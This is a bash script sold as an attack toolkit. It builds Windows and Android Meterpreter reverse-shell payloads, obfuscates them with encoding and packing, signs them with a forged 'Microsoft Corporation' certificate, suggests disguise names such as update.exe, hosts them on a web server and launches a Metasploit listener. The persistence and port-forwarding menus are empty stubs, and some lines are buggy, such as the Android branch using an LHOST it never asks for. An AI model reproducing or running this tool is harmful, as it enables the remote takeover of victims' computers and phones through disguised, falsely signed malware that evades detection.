#!/bin/bash

# Function to display the banner
display_banner() {
    clear  # Clear the screen before displaying the banner
    echo -e "\e[91m"
    echo "░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░"
    echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░"
    echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░"
    echo "░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░     ░▒▓█▓▒░░░▒▓████████▓▒░▒▓████████▓▒░"
    echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░"
    echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░    ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░"
    echo "░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░     ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░"
    echo -e "\e[0m"
    echo -e "\e[1;36mRU7H4's Ultimate Toolkit\e[0m"
    echo "--------------"
}

# Function to check if required tools are installed
check_requirements() {
    local tools=("$@")
    for tool in "${tools[@]}"; do
        if ! command -v $tool &>/dev/null; then
            echo -e "\e[91m[!] $tool is not installed. Please install it to continue.\e[0m"
            exit 1
        fi
    done
}

# Main menu navigation
main_menu() {
    display_banner
    echo -e "\e[92m[1]\e[0m \e[1;34mDevices (Windows/Android)\e[0m"
    echo -e "\e[92m[2]\e[0m \e[1;34mPost-Exploitation\e[0m"
    echo -e "\e[92m[3]\e[0m \e[1;34mPort Forwarding\e[0m"
    echo -e "\e[92m[4]\e[0m \e[1;34mExit\e[0m"
    echo -e "\nPlease select an option (1-4): "
    read -p "Select an option (1-4): " MAIN_OPTION
}

# Device Payload Generation Section
device_payload_generation() {
    display_banner
    echo -e "\n\e[92m[1]\e[0m \e[1;34mWindows\e[0m"
    echo -e "\e[92m[2]\e[0m \e[1;34mAndroid\e[0m"
    echo -e "\e[92m[3]\e[0m \e[1;34mBack\e[0m"
    read -p "Select a device type (1, 2 or 3): " DEVICE_TYPE
    if [[ $DEVICE_TYPE -eq 3 ]]; then
        return  # Go back to the main menu
    fi

    # Windows Payload Generation
    if [[ $DEVICE_TYPE -eq 1 ]]; then
        check_requirements "msfvenom apache2"
        read -p "Enter your LHOST (Local Host IP): " LHOST
        read -p "Enter LPORT (Listening Port): " LPORT
        read -p "Enter the output payload name (e.g., update.exe): " PAYLOAD_NAME
        echo -e "\e[93m[+] Generating Windows payload with obfuscation...\e[0m"
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x86/shikata_ga_nai -i 10 -f exe -o raw_$PAYLOAD_NAME
        if [ -s raw_$PAYLOAD_NAME ]; then
            echo -e "\e[93m[+] Applying UPX obfuscation...\e[0m"
            if command -v upx &>/dev/null; then
                upx --best --lzma raw_$PAYLOAD_NAME -o $PAYLOAD_NAME
                rm raw_$PAYLOAD_NAME
            else
                echo -e "\e[91m[!] UPX not installed, renaming raw payload.\e[0m"
                mv raw_$PAYLOAD_NAME $PAYLOAD_NAME
            fi
            echo -e "\e[93m[+] Signing payload with fake certificate...\e[0m"
            if command -v osslsigncode &>/dev/null; then
                openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=Microsoft Corporation"
                osslsigncode sign -certs cert.pem -key key.pem -in $PAYLOAD_NAME -out signed_$PAYLOAD_NAME
                mv signed_$PAYLOAD_NAME $PAYLOAD_NAME
                rm key.pem cert.pem
            else
                echo -e "\e[91m[!] osslsigncode not installed, skipping signing.\e[0m"
            fi
            echo -e "\e[93m[+] Setting up Apache server...\e[0m"
            systemctl start apache2
            systemctl enable apache2
            WEB_DIR="/var/www/html"
            cp $PAYLOAD_NAME $WEB_DIR/
            echo -e "\e[92m[+] Payload hosted at: http://$LHOST/$PAYLOAD_NAME\e[0m"
        else
            echo -e "\e[91m[-] Payload generation failed. Check msfvenom parameters.\e[0m"
            exit 1
        fi
        cat <<EOF > listener.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF
        echo -e "\e[92m[+] Metasploit Listener script saved as listener.rc\e[0m"
        echo -e "\e[92m[+] Starting Metasploit Listener...\e[0m"
        msfconsole -r listener.rc

    # Android Payload Generation
    elif [[ $DEVICE_TYPE -eq 2 ]]; then
        check_requirements "msfvenom apache2 apktool jarsigner"
        read -p "Enter LPORT (Listening Port): " LPORT
        read -p "Enter the output APK name (e.g., update.apk): " PAYLOAD_NAME
        echo -e "\e[93m[+] Generating Android payload with obfuscation...\e[0m"
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o raw_$PAYLOAD_NAME
        if [ -s raw_$PAYLOAD_NAME ]; then
            echo -e "\e[93m[+] Obfuscating APK using APKTool...\e[0m"
            apktool d raw_$PAYLOAD_NAME -o temp_apk
            apktool b temp_apk -o $PAYLOAD_NAME
            rm -rf temp_apk raw_$PAYLOAD_NAME
            echo -e "\e[93m[+] Signing APK with fake certificate...\e[0m"
            keytool -genkey -v -keystore fake.keystore -alias android -keyalg RSA -keysize 2048 -validity 10000 -storepass password -keypass password -dname "CN=Android"
            jarsigner -verbose -keystore fake.keystore -storepass password -keypass password $PAYLOAD_NAME android
            rm fake.keystore
            echo -e "\e[93m[+] Setting up Apache server...\e[0m"
            systemctl start apache2
            systemctl enable apache2
            WEB_DIR="/var/www/html"
            cp $PAYLOAD_NAME $WEB_DIR/
            echo -e "\e[92m[+] Payload hosted at: http://$LHOST/$PAYLOAD_NAME\e[0m"
        else
            echo -e "\e[91m[-] Payload generation failed. Check msfvenom parameters.\e[0m"
            exit 1
        fi
        cat <<EOF > listener.rc
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF
        echo -e "\e[92m[+] Metasploit Listener script saved as listener.rc\e[0m"
        echo -e "\e[92m[+] Starting Metasploit Listener...\e[0m"
        msfconsole -r listener.rc
    fi
}

# Post-Exploitation Section
post_exploitation() {
    display_banner
    echo -e "\n\e[92m[1]\e[0m \e[1;34mWindows Persistence\e[0m"
    echo -e "\e[92m[2]\e[0m \e[1;34mLinux Persistence\e[0m"
    echo -e "\e[92m[3]\e[0m \e[1;34mAndroid Persistence\e[0m"
    echo -e "\e[92m[4]\e[0m \e[1;34mBack\e[0m"
    read -p "Select an option (1-4): " PERSIST_OPTION
    if [[ $PERSIST_OPTION -eq 4 ]]; then
        return  # Go back to the main menu
    fi
    # (Add post-exploitation tasks here)
}

# Port Forwarding Section
port_forwarding() {
    display_banner
    echo -e "\n\e[92m[1]\e[0m \e[1;34mForward Ports\e[0m"
    echo -e "\e[92m[2]\e[0m \e[1;34mBack\e[0m"
    read -p "Select an option (1 or 2): " FORWARD_OPTION
    if [[ $FORWARD_OPTION -eq 2 ]]; then
        return  # Go back to the main menu
    fi
    # (Add port forwarding tasks here)
}

# Main navigation based on user input
while true; do
    main_menu
    case $MAIN_OPTION in
        1) device_payload_generation ;;
        2) post_exploitation ;;
        3) port_forwarding ;;
        4) echo -e "\e[92m[+] Exiting. Goodbye!\e[0m" ; exit 0 ;;
        *)
            echo -e "\e[91m[-] Invalid option! Exiting...\e[0m"
            exit 1
            ;;
    esac
done
